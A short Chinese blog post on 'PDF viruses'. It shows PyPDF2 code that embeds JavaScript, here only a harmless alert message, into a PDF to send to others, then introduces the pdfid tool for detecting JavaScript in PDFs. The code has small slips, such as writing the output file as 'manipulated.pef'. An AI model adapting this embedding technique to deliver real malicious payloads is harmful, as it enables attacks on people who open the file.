---
title: 想黑一台电脑，只需要发送一件PDF
date: 2025-06-30 13:17:17
tags: hack
---

PDF是一个广泛应用和传播的文件类型。

在这样的情况下，让一个黑客得知"PDF打开时支持javascript"时，他的基因一定会动。



下面有两个分享

1. 如何制造pdf病毒

2. 如何防范pdf病毒



#### 制造

---

+ 准备一张pdf文件

+ 植入自己的木马程序

  ```python
  # 可以用这段python代码植入javascripts写的木马
  
  # 确保python已经安装了pdf编辑组件
  from PyPDF2 import PdfReader, PdfWriter
  # 准备好的pdf的路径
  reader = PdfReader("～/***.pdf")
  writer = PdfWriter()
  for page in reader.pages:
  		writer.add_page(page)
  
  # 木马（想干什么都可以自由发挥）：
  writer.add_js("app.alert('Dogs and cats are dancing here!');")
  
  # 以manipulated.pdf为命名，输出新的携带木马的pdf
  with open("manipulated.pef","wb") as f:
    	 writer.write(f)
  
  # 发给别人
  ```

+ 把manipulated.pdf发给别人。如下截图：执行了木马程序了：

  + (我只是简单的给他写了一封信，"猫狗在你电脑里嗨")

  ![img](https://picx.zhimg.com/80/v2-7d746eef171680d4a9831682dc741285_1440w.png)



#### 防范

---

第一种防范：

​	这里分享一款恶意PDF检测工具pdfid，使用也很简单

```bash
pdfid xxx.pdf
```

![img](https://pic1.zhimg.com/80/v2-6d01fcc88fd75894ef4d701cbc08e62c_1440w.png?source=d16d100b)

通常恶意的PDF文件都嵌套有JavaScript代码, 这是判断是否为恶意文件的重要依据, 这里javascript就有两个, xref或者trailer关键字段也有一定的可能城市木马的可能性。
